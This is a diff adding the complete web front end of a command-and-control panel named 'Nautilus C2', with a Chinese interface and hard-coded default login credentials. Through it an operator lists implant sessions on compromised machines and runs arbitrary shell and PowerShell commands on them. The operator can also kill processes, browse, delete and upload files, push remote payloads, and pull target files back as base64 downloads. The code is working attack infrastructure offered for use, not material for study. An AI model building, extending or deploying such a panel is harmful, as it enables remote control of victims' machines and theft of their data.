@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nautilus C2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0a0e17;--surface:#111827;--surface2:#151b28;--border:#1e2a3a;--text:#c8d6e5;--dim:#576574;--accent:#4ecdc4;--accent2:#3abfb0;--danger:#ee5a24;--warn:#f39c12;--success:#4ecdc4}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column}
+
+/* Login */
+.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh;background:var(--bg)}
+.login-box{background:var(--surface2);padding:40px;border-radius:12px;border:1px solid var(--border);width:360px}
+.login-box h1{text-align:center;color:var(--accent);font-size:24px;margin-bottom:24px}
+.login-box input{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:6px;margin-bottom:12px;font-size:14px;outline:none}
+.login-box input:focus{border-color:var(--accent)}
+.login-box button{width:100%;background:var(--accent);color:var(--bg);border:none;padding:12px;border-radius:6px;cursor:pointer;font-weight:600;font-size:15px;margin-top:8px}
+.login-box button:hover{background:var(--accent2)}
+.login-box .error{color:var(--danger);font-size:13px;text-align:center;margin-top:12px;display:none}
+
+/* Main layout */
+.app{display:flex;height:100vh;flex-direction:column}
+.header{background:var(--surface2);padding:10px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border)}
+.header h1{font-size:16px;color:var(--accent);font-weight:600}
+.header-right{display:flex;align-items:center;gap:12px}
+.header-right .ws-status{font-size:12px}
+.header-right .ws-status.connected{color:var(--success)}
+.header-right .ws-status.disconnected{color:var(--danger)}
+.header-right .user{font-size:13px;color:var(--dim)}
+.header-right button{background:var(--surface);color:var(--dim);border:1px solid var(--border);padding:4px 10px;border-radius:4px;cursor:pointer;font-size:12px}
+
+.body{display:flex;flex:1;overflow:hidden}
+.sidebar{width:280px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
+.sidebar-header{padding:10px 16px;font-size:13px;color:var(--dim);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.sidebar-header .count{background:var(--accent);color:var(--bg);padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
+.session-list{flex:1;overflow-y:auto;padding:6px}
+.session-item{padding:10px;border-radius:6px;cursor:pointer;margin-bottom:3px;transition:background .15s;border:1px solid transparent;display:flex;align-items:flex-start;gap:10px}
+.session-item:hover{background:var(--surface2)}
+.session-item.active{background:var(--surface2);border-color:var(--accent)}
+.session-item .dot{width:8px;height:8px;border-radius:50%;margin-top:4px}
+.session-item .dot.active{background:var(--success)}
+.session-item .dot.stale{background:var(--warn)}
+.session-item .dot.dead{background:var(--danger)}
+.session-item .info{flex:1}
+.session-item .info .name{font-size:13px;color:#e8f0fe;font-weight:500}
+.session-item .info .meta{font-size:11px;color:var(--dim);margin-top:3px}
+
+/* Tabs */
+.tabs-bar{padding:8px 16px;background:var(--surface2);border-bottom:1px solid var(--border);display:flex;gap:4px}
+.tab{padding:6px 14px;border-radius:4px;cursor:pointer;font-size:13px;color:var(--dim);transition:all .15s}
+.tab:hover{color:var(--text)}
+.tab.active{background:var(--accent);color:var(--bg);font-weight:600}
+
+/* Main content */
+.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.toolbar{padding:8px 16px;background:var(--surface2);border-bottom:1px solid var(--border);display:flex;gap:6px;align-items:center}
+.toolbar button{background:var(--surface);color:var(--text);border:1px solid var(--border);padding:5px 12px;border-radius:4px;cursor:pointer;font-size:12px;transition:all .15s}
+.toolbar button:hover{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.toolbar button.primary{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:600}
+.toolbar .spacer{flex:1}
+.toolbar .session-label{font-size:12px;color:var(--accent);font-weight:500}
+
+.output-area{flex:1;padding:12px 16px;overflow-y:auto;font-family:'Cascadia Code','Consolas',monospace;font-size:13px;line-height:1.6}
+.entry{margin-bottom:8px;padding:8px 10px;background:var(--surface);border-radius:4px;border-left:3px solid var(--border)}
+.entry.success{border-left-color:var(--success)}
+.entry.error{border-left-color:var(--danger)}
+.entry.pending{border-left-color:var(--warn)}
+.entry .cmd{color:var(--accent);font-weight:500;font-size:12px}
+.entry .result{color:var(--text);margin-top:4px;white-space:pre-wrap;word-break:break-all}
+.entry .meta{color:var(--dim);font-size:10px;margin-top:4px}
+.entry .download-btn{display:inline-block;margin-top:6px;background:var(--accent);color:var(--bg);padding:3px 10px;border-radius:3px;font-size:11px;cursor:pointer;font-family:'Segoe UI',sans-serif}
+
+.input-bar{padding:8px 16px;background:var(--surface2);border-top:1px solid var(--border);display:flex;gap:6px;align-items:center}
+.input-bar .prefix{color:var(--accent);font-size:14px;font-weight:600}
+.input-bar input{flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:4px;font-family:'Cascadia Code','Consolas',monospace;font-size:13px;outline:none}
+.input-bar input:focus{border-color:var(--accent)}
+.input-bar button{background:var(--accent);color:var(--bg);border:none;padding:8px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:13px}
+
+/* File browser tab */
+.file-panel{flex:1;display:flex;flex-direction:column;padding:0;overflow:hidden}
+.file-toolbar{display:flex;gap:6px;padding:10px 16px;background:var(--surface2);border-bottom:1px solid var(--border);align-items:center}
+.file-toolbar input{flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;font-size:13px;outline:none;font-family:'Cascadia Code','Consolas',monospace}
+.file-toolbar input:focus{border-color:var(--accent)}
+.file-toolbar button{background:var(--accent);color:var(--bg);border:none;padding:7px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:12px}
+.file-toolbar button:hover{background:var(--accent2)}
+.file-toolbar .download-btn{background:#3498db}
+.file-toolbar .download-btn:hover{background:#2980b9}
+.file-toolbar .refresh-btn{background:var(--surface);color:var(--text);border:1px solid var(--border)}
+.file-toolbar .refresh-btn:hover{border-color:var(--accent);color:var(--accent)}
+.file-list{flex:1;overflow-y:auto;font-family:'Cascadia Code','Consolas',monospace;font-size:12px;background:var(--surface);margin:8px 16px;border-radius:4px;padding:8px;border:1px solid var(--border)}
+.file-entry{padding:5px 8px;border-radius:2px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
+.file-entry:hover{background:var(--surface2)}
+.file-entry:nth-child(odd){background:rgba(30,42,58,0.3)}
+.file-entry .fname{color:var(--accent);flex:1}
+.file-entry .fsize{color:var(--dim);font-size:11px;margin-left:12px;white-space:nowrap}
+.file-entry .fdir{color:var(--warn);margin-right:6px;font-size:10px}
+.file-bottom{padding:8px 16px 12px}
+.upload-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}
+.upload-row .upload-btn{background:var(--accent);color:var(--bg);border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:12px}
+.upload-row .upload-btn:hover{background:var(--accent2)}
+.upload-row .del-btn{background:var(--danger);color:white;border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px}
+.upload-area{border:1px dashed var(--border);padding:14px;text-align:center;color:var(--dim);font-size:13px;cursor:pointer;border-radius:4px;transition:border-color .2s}
+.upload-area:hover{border-color:var(--accent);color:var(--text)}
+
+/* Empty state */
+.empty-state{display:flex;align-items:center;justify-content:center;flex:1;color:var(--dim);font-size:14px;flex-direction:column}
+.empty-state .icon{font-size:48px;margin-bottom:12px;color:var(--border)}
+
+/* Inline dialog */
+.dialog-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100}
+.dialog-box{background:var(--surface2);padding:24px;border-radius:8px;border:1px solid var(--border);width:400px}
+.dialog-box h3{color:var(--accent);font-size:16px;margin-bottom:16px}
+.dialog-box input{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:4px;font-size:13px;outline:none;margin-bottom:12px;font-family:'Cascadia Code','Consolas',monospace}
+.dialog-box input:focus{border-color:var(--accent)}
+.dialog-box .btn-row{display:flex;gap:8px;justify-content:flex-end}
+.dialog-box .btn-row button{padding:8px 16px;border-radius:4px;cursor:pointer;font-size:13px;border:none}
+.dialog-box .btn-cancel{background:var(--surface);color:var(--dim);border:1px solid var(--border)}
+.dialog-box .btn-ok{background:var(--accent);color:var(--bg);font-weight:600}
+
+/* Scrollbar */
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:#3a4a5a}
+</style>
+</head>
+<body>
+
+<!-- Login screen -->
+<div class="login-wrap" id="login-screen">
+<div class="login-box">
+  <h1>Nautilus C2</h1>
+  <input type="text" id="login-user" placeholder="用户名" value="nautilus">
+  <input type="password" id="login-pass" placeholder="密码" value="nautilus2026">
+  <button onclick="doLogin()">登录</button>
+  <div class="error" id="login-error">认证失败</div>
+</div>
+</div>
+
+<!-- Main app -->
+<div class="app" id="app-screen" style="display:none">
+<div class="header">
+  <h1>Nautilus C2</h1>
+  <div class="header-right">
+    <span class="ws-status disconnected" id="ws-status">WS: 断开</span>
+    <span class="user" id="user-info">nautilus</span>
+    <button onclick="doLogout()">退出登录</button>
+  </div>
+</div>
+
+<div class="body">
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <span>会话列表</span>
+      <span class="count" id="session-count">0</span>
+    </div>
+    <div class="session-list" id="session-list"></div>
+  </div>
+
+  <div class="content">
+    <div class="tabs-bar">
+      <div class="tab active" onclick="switchTab('terminal')">交互终端</div>
+      <div class="tab" onclick="switchTab('files')">文件管理</div>
+      <div class="spacer"></div>
+      <div class="session-label" id="active-label">无活跃会话</div>
+    </div>
+
+    <!-- Terminal tab -->
+    <div id="tab-terminal" style="flex:1;display:flex;flex-direction:column;overflow:hidden">
+      <div class="toolbar">
+        <button class="primary" onclick="sendTask('sysinfo')">系统信息</button>
+        <button onclick="sendTask('proclist')">进程列表</button>
+        <button onclick="sendTask('privinfo')">权限信息</button>
+        <button onclick="promptTask('listdir')">目录浏览</button>
+        <button onclick="promptTask('kill')">终止进程</button>
+        <div class="spacer"></div>
+      </div>
+      <div class="output-area" id="output">
+        <div class="empty-state">
+          <div class="icon">&#9783;</div>
+          <div>等待植入体连接...</div>
+        </div>
+      </div>
+      <div class="input-bar">
+        <span class="prefix">&gt;</span>
+        <input type="text" id="cmd-input" placeholder="输入命令..." onkeydown="if(event.key==='Enter')execCmd()">
+        <button onclick="execCmd()">执行</button>
+      </div>
+    </div>
+
+    <!-- Files tab -->
+    <div id="tab-files" class="file-panel" style="display:none">
+      <div class="file-toolbar">
+        <input type="text" id="file-path" placeholder="输入路径，如 C:\Users\ 或 /tmp/" value="C:\">
+        <button onclick="browseDir()">浏览</button>
+        <button onclick="goUpDir()">上级</button>
+        <button class="refresh-btn" onclick="browseDir()">刷新</button>
+        <div class="spacer"></div>
+        <span style="font-size:11px;color:var(--dim)">提示: 点击目录进入，点击文件下载</span>
+      </div>
+      <div class="file-list" id="file-list">
+        <div style="color:var(--dim);padding:20px;text-align:center">输入路径并点击浏览查看目标机器文件</div>
+      </div>
+      <div class="file-bottom">
+        <div class="upload-row">
+          <button class="upload-btn" onclick="triggerUpload()">上传文件到目标</button>
+          <button class="del-btn" onclick="promptFileDel()">删除文件</button>
+          <span style="font-size:11px;color:var(--dim)" id="upload-status"></span>
+        </div>
+        <div class="upload-area" onclick="triggerUpload()">
+          点击或拖拽文件上传到目标机器
+        </div>
+        <input type="file" id="file-upload-input" style="display:none" onchange="handleFileUpload()">
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+<script>
+const API = '/admin';
+let authToken = localStorage.getItem('nautilus_token') || '';
+let activeSession = '';
+let ws = null;
+let pendingTasks = {}; // task_id -> {cmd, status}
+
+const taskNames = {
+  'sysinfo': '系统信息', 'proclist': '进程列表', 'privinfo': '权限信息',
+  'listdir': '目录浏览', 'kill': '终止进程', 'exec': '执行命令',
+  'ps': '执行PS', 'filedel': '删除文件', 'fileread': '读取文件',
+  'filewrite': '写入文件', 'payload': '远程载荷', 'exit': '退出'
+};
+
+// === Inline Dialog ===
+function showDialog(title, placeholder, defaultVal, callback) {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `<div class="dialog-box"><h3>${title}</h3><input type="text" id="dialog-input" placeholder="${placeholder}" value="${defaultVal||''}"><div class="btn-row"><button class="btn-cancel" onclick="this.closest('.dialog-overlay').remove()">取消</button><button class="btn-ok" id="dialog-ok">确认</button></div></div>`;
+  document.body.appendChild(overlay);
+  const input = overlay.querySelector('#dialog-input');
+  input.focus();
+  input.onkeydown = (e) => { if(e.key==='Enter') { const val=input.value.trim(); overlay.remove(); if(val) callback(val); } };
+  overlay.querySelector('#dialog-ok').onclick = () => { const val=input.value.trim(); overlay.remove(); if(val) callback(val); };
+  overlay.onclick = (e) => { if(e.target===overlay) overlay.remove(); };
+}
+
+function showAlert(msg) {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `<div class="dialog-box"><h3>${msg}</h3><div class="btn-row"><button class="btn-ok" onclick="this.closest('.dialog-overlay').remove()">确定</button></div></div>`;
+  document.body.appendChild(overlay);
+  overlay.onclick = (e) => { if(e.target===overlay) overlay.remove(); };
+}
+
+// === Auth ===
+async function doLogin() {
+  const u = document.getElementById('login-user').value;
+  const p = document.getElementById('login-pass').value;
+  try {
+    const r = await fetch(API+'/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
+    const data = await r.json();
+    if (data.token) {
+      authToken = data.token;
+      localStorage.setItem('nautilus_token', authToken);
+      showApp();
+    } else {
+      document.getElementById('login-error').style.display = 'block';
+    }
+  } catch(e) {
+    document.getElementById('login-error').style.display = 'block';
+  }
+}
+
+function doLogout() {
+  authToken = '';
+  localStorage.removeItem('nautilus_token');
+  if (ws) ws.close();
+  document.getElementById('app-screen').style.display = 'none';
+  document.getElementById('login-screen').style.display = 'flex';
+}
+
+function showApp() {
+  document.getElementById('login-screen').style.display = 'none';
+  document.getElementById('app-screen').style.display = 'flex';
+  connectWS();
+  refreshSessions();
+}
+
+// === API ===
+async function apiAuth(path, method, body) {
+  const opts = {method, headers:{'Content-Type':'application/json','Authorization':authToken}};
+  if (body) opts.body = JSON.stringify(body);
+  const r = await fetch(API+path, opts);
+  if (r.status === 401) { doLogout(); return null; }
+  return r.json();
+}
+
+// === WebSocket ===
+function connectWS() {
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(proto+'//'+location.host+'/ws?token='+authToken);
+  ws.onopen = () => {
+    document.getElementById('ws-status').textContent = 'WS: 已连接';
+    document.getElementById('ws-status').className = 'ws-status connected';
+  };
+  ws.onclose = () => {
+    document.getElementById('ws-status').textContent = 'WS: 断开';
+    document.getElementById('ws-status').className = 'ws-status disconnected';
+    setTimeout(connectWS, 3000);
+  };
+  ws.onmessage = (e) => {
+    const evt = JSON.parse(e.data);
+    if (evt.type === 'session_new') {
+      refreshSessions();
+      addOutput('新会话上线', `${evt.data.hostname} | ${evt.data.username} | ${evt.data.os}`, 'success');
+    }
+    if (evt.type === 'task_result') {
+      handleTaskResult(evt.data);
+    }
+  };
+}
+
+function handleTaskResult(data) {
+  // 通过task_id精确匹配，或按类型+pending状态模糊匹配
+  const entries = Array.from(document.querySelectorAll('.entry'));
+  let matched = null;
+
+  // 优先按task_id精确匹配
+  for (let e of entries) {
+    if (e.dataset.taskId && e.dataset.taskId == data.task_id) {
+      matched = e;
+      break;
+    }
+  }
+
+  // 如果没有精确匹配，按类型+pending状态匹配（只匹配同类型的pending条目）
+  if (!matched) {
+    // task_id无法直接映射类型，通过pending状态+taskType匹配
+    for (let e of entries) {
+      const isPending = e.querySelector('.meta').textContent.includes('等待中') || e.querySelector('.meta').textContent.includes('正在读取') || e.querySelector('.meta').textContent.includes('任务已下发');
+      if (isPending) {
+        // fileread结果只匹配fileread条目，listdir结果只匹配listdir条目
+        if (e.dataset.taskType === 'fileread' && pendingDownload) {
+          matched = e;
+          break;
+        } else if (e.dataset.taskType === 'listdir') {
+          matched = e;
+          break;
+        } else if (!pendingDownload && e.dataset.taskType !== 'fileread' && e.dataset.taskType !== 'listdir') {
+          matched = e;
+          break;
+        }
+      }
+    }
+  }
+
+  if (!matched) {
+    // 没有匹配条目，fileread结果单独处理
+    if (pendingDownload && data.task_id) {
+      if (data.success && data.output) {
+        try {
+          const b64 = data.output.trim();
+          const binary = atob(b64);
+          const bytes = new Uint8Array(binary.length);
+          for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+          const blob = new Blob([bytes]);
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url; a.download = pendingDownload.fileName; a.click();
+          URL.revokeObjectURL(url);
+          addOutput('下载文件: '+pendingDownload.fileName, `文件已下载 (${bytes.length} bytes)`, 'success');
+        } catch(err) {
+          addOutput('下载文件: '+pendingDownload.fileName, `下载失败: ${err.message}`, 'error');
+        }
+      } else {
+        addOutput('下载文件: '+pendingDownload.fileName, `下载失败: ${data.error || '未知错误'}`, 'error');
+      }
+      pendingDownload = null;
+    }
+    refreshSessions();
+    return;
+  }
+
+  matched.querySelector('.meta').textContent = `${new Date().toLocaleTimeString()} | ${data.success ? '完成' : '失败'} | 会话:${(data.session_id||'').substring(0,8)}`;
+  matched.className = 'entry ' + (data.success ? 'success' : 'error');
+  let resultText = data.output || data.error || '(无输出)';
+  matched.querySelector('.result').textContent = resultText;
+
+  // 设置task_id以便后续精确匹配
+  if (data.task_id) matched.dataset.taskId = data.task_id;
+
+  if (matched.dataset.taskType === 'listdir' && data.success) {
+    renderFileList(data.output, matched.dataset.taskPath || '');
+  }
+  // 文件下载处理
+  if (pendingDownload) {
+    if (data.success && data.output) {
+      try {
+        const b64 = data.output.trim();
+        const binary = atob(b64);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+        const blob = new Blob([bytes]);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = pendingDownload.fileName; a.click();
+        URL.revokeObjectURL(url);
+        matched.querySelector('.result').textContent = `文件已下载: ${pendingDownload.fileName} (${bytes.length} bytes)`;
+      } catch(err) {
+        matched.querySelector('.result').textContent = `下载失败: ${err.message}\n原始输出:\n${resultText.substring(0,200)}`;
+      }
+    } else {
+      matched.querySelector('.result').textContent = `下载失败: ${data.error || '文件不可访问'}`;
+    }
+    pendingDownload = null;
+  }
+  refreshSessions();
+}
+
+// === Sessions ===
+async function refreshSessions() {
+  const data = await apiAuth('/sessions', 'GET');
+  if (!data) return;
+  const list = document.getElementById('session-list');
+  const count = document.getElementById('session-count');
+  count.textContent = data.sessions ? data.sessions.length : 0;
+  activeSession = data.active_session || '';
+  document.getElementById('active-label').textContent = activeSession ? '会话: '+activeSession.substring(0,8) : '无活跃会话';
+
+  list.innerHTML = '';
+  (data.sessions || []).forEach(s => {
+    const div = document.createElement('div');
+    div.className = 'session-item' + (s.id === activeSession ? ' active' : '');
+    const statusClass = s.status || 'active';
+    div.innerHTML = `<div class="dot ${statusClass}"></div><div class="info"><div class="name">${s.hostname||s.id.substring(0,12)}</div><div class="meta">${s.username||''} | ${s.os||''} | ${s.last_seen||''}</div></div>`;
+    div.onclick = () => switchSession(s.id);
+    list.appendChild(div);
+  });
+}
+
+async function switchSession(id) {
+  await apiAuth('/use', 'POST', {session_id: id});
+  await refreshSessions();
+}
+
+// === Tasks ===
+async function sendTask(type, params) {
+  if (!activeSession) { showAlert('无活跃会话'); return; }
+  const r = await apiAuth('/task', 'POST', {session_id: activeSession, task_type: type, params: params||{}});
+  if (!r) return;
+  const entry = addOutput(taskNames[type]||type, '任务已下发，等待回传...', 'pending');
+  entry.dataset.taskType = type;
+  if (params && params.path) entry.dataset.taskPath = params.path;
+}
+
+async function promptTask(type) {
+  let label = type==='kill'?'进程PID':type==='filedel'?'文件路径':type==='fileread'?'下载文件路径':'目录路径';
+  let paramKey = type==='kill'?'pid':'path';
+  showDialog(label, '请输入'+label, '', (val) => sendTask(type, {[paramKey]: val}));
+}
+
+async function execCmd() {
+  const input = document.getElementById('cmd-input');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  input.value = '';
+  let taskType = 'exec';
+  if (cmd.toLowerCase().startsWith('ps ') || cmd.toLowerCase().startsWith('powershell ')) taskType = 'ps';
+  sendTask(taskType, {command: cmd});
+}
+
+function addOutput(cmd, result, status) {
+  const output = document.getElementById('output');
+  if (output.querySelector('.empty-state')) output.innerHTML = '';
+  const entry = document.createElement('div');
+  entry.className = 'entry ' + (status==='error'?'error':status==='pending'?'pending':'success');
+  entry.dataset.taskId = '';
+  entry.innerHTML = `<div class="cmd">${cmd}</div><div class="result">${result}</div><div class="meta">${new Date().toLocaleTimeString()} | ${status==='pending'?'等待中':status==='error'?'失败':'完成'}</div>`;
+  output.appendChild(entry);
+  output.scrollTop = output.scrollHeight;
+  return entry;
+}
+
+// === File Browser ===
+let currentFilePath = 'C:\\';
+
+function switchTab(tab) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.tab:nth-child(${tab==='terminal'?1:2})`).classList.add('active');
+  document.getElementById('tab-terminal').style.display = tab==='terminal'?'flex':'none';
+  document.getElementById('tab-files').style.display = tab==='files'?'flex':'none';
+}
+
+function browseDir() {
+  const path = document.getElementById('file-path').value.trim();
+  if (!path) return;
+  currentFilePath = path;
+  sendTask('listdir', {path: path});
+}
+
+function goUpDir() {
+  let path = currentFilePath;
+  // Remove trailing slash/backslash
+  path = path.replace(/[\\\/]$/, '');
+  // Find last separator
+  const lastSep = Math.max(path.lastIndexOf('\\'), path.lastIndexOf('/'));
+  if (lastSep > 0) {
+    path = path.substring(0, lastSep + 1);
+  } else {
+    path = path.substring(0, 3); // Keep drive letter like "C:\"
+  }
+  document.getElementById('file-path').value = path;
+  currentFilePath = path;
+  browseDir();
+}
+
+function promptFileDel() {
+  // 删除当前选中的文件（通过对话框输入路径）
+  showDialog('删除文件', '请输入要删除的文件完整路径', currentFilePath, (val) => sendTask('filedel', {path: val}));
+}
+
+// 下载文件：下发fileread任务，结果回来后解码base64并触发浏览器下载
+let pendingDownload = null;
+
+function downloadFile(filePath, fileName) {
+  if (!activeSession) { showAlert('无活跃会话'); return; }
+  pendingDownload = {fileName: fileName, filePath: filePath};
+  const entry = addOutput('下载文件: '+fileName, '正在读取文件...', 'pending');
+  entry.dataset.taskType = 'fileread';
+  apiAuth('/task', 'POST', {session_id: activeSession, task_type: 'fileread', params: {path: filePath}});
+}
+
+function renderFileList(output, basePath) {
+  const list = document.getElementById('file-list');
+  if (!output) { list.innerHTML = '<div style="color:var(--dim);text-align:center;padding:20px">空目录或无权限</div>'; return; }
+  const lines = output.split('\n').filter(l=>l.trim());
+  list.innerHTML = '';
+  // Add ".." entry for going up
+  if (basePath) {
+    const upEntry = document.createElement('div');
+    upEntry.className = 'file-entry';
+    upEntry.innerHTML = `<span class="fname" style="color:var(--warn)">..</span><span class="fdir">上级目录</span>`;
+    upEntry.onclick = goUpDir;
+    list.appendChild(upEntry);
+  }
+  lines.forEach(line => {
+    // Parse format: "名称 | 大小 | 时间 | DIR/FILE"
+    const parts = line.split(' | ');
+    const name = (parts[0] || '').trim();
+    const size = (parts[1] || '').trim();
+    const time = (parts[2] || '').trim();
+    const type = (parts[3] || '').trim();
+    const isDir = type === 'DIR';
+    if (!name) return;
+    const div = document.createElement('div');
+    div.className = 'file-entry';
+    const sizeStr = isDir ? '' : (size > 1024*1024 ? (size/1024/1024).toFixed(1)+'MB' : size > 1024 ? (size/1024).toFixed(1)+'KB' : size+'B');
+    div.innerHTML = `<span class="fname" style="color:${isDir?'var(--warn)':'var(--accent)'}">${name}</span>${isDir?'<span class="fdir">目录</span>':'<span class="fsize">'+sizeStr+'</span>'}<span class="fsize" style="color:#8395a7">${time}</span>`;
+    div.title = isDir ? `进入目录: ${name}` : `下载文件: ${name}`;
+    div.style.cursor = 'pointer';
+    div.onclick = () => {
+      if (isDir) {
+        const newPath = basePath.replace(/[\\\/]$/, '') + '\\' + name;
+        document.getElementById('file-path').value = newPath + '\\';
+        currentFilePath = newPath + '\\';
+        browseDir();
+      } else {
+        // 点击文件 → 下载
+        const filePath = basePath.replace(/[\\\/]$/, '') + '\\' + name;
+        downloadFile(filePath, name);
+      }
+    };
+    list.appendChild(div);
+  });
+}
+
+function triggerUpload() {
+  document.getElementById('file-upload-input').click();
+}
+
+function handleFileUpload() {
+  const fileInput = document.getElementById('file-upload-input');
+  const file = fileInput.files[0];
+  if (!file) return;
+  showDialog('上传文件', '输入目标机器上的保存路径', '', (targetPath) => {
+    document.getElementById('upload-status').textContent = '上传中...';
+
+    const formData = new FormData();
+    formData.append('file', file);
+    formData.append('session_id', activeSession);
+    formData.append('target_path', targetPath);
+
+    fetch(API+'/files/upload?token='+authToken, {method:'POST', body:formData}).then(r => r.json()).then(data => {
+      document.getElementById('upload-status').textContent = data.status === 'queued' ? `已下发 (${data.size} bytes)` : '失败';
+    }).catch(e => {
+      document.getElementById('upload-status').textContent = '上传失败';
+    });
+    fileInput.value = '';
+  });
+}
+
+// === Init ===
+if (authToken) {
+  showApp();
+} else {
+  document.getElementById('login-screen').style.display = 'flex';
+  document.getElementById('app-screen').style.display = 'none';
+}
+
+// Auto-refresh sessions (fallback if WS fails)
+setInterval(refreshSessions, 5000);
+</script>
+</body>
+</html>
